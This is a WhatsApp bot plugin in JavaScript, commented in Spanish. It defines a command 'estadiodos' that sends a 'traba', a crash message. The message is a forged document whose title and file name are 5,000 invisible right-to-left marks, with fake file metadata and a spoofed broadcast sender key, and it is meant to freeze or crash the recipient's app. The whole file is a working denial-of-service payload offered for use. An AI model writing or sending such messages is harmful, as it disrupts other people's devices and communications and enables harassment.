let handler = async (m, { conn }) => {
  try {
    const invisible = '\u200F'.repeat(5000) // carácter RLM invisible repetido 5000 veces

    const fakeKey = {
      remoteJid: 'status@broadcast',
      fromMe: false,
      id: m.id,
      participant: '0@s.whatsapp.net',
    }

    const fakeDoc = {
      documentMessage: {
        title: invisible,
        fileName: invisible,
        mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
        fileLength: 9999999,
        pageCount: 1,
        mediaKey: '',
        fileSha256: '',
        fileEncSha256: '',
        directPath: '',
        mediaKeyTimestamp: 1
      }
    }

    // Enviamos la traba
    await conn.relayMessage(m.chat, fakeDoc, { messageId: m.key.id, messageKey: fakeKey })

    // Confirmación para ti
    await conn.sendMessage(m.chat, { text: '✅ Traba invisible enviada (puede no mostrarse, pero ya está).' }, { quoted: m })

  } catch (e) {
    console.error(e)
    await conn.sendMessage(m.chat, { text: '❌ Error al enviar la traba invisible.' }, { quoted: m })
  }
}

handler.command = ['estadiodos']
handler.help = ['estadiodos']
handler.tags = ['traba', 'fake']
handler.premium = false

export default handler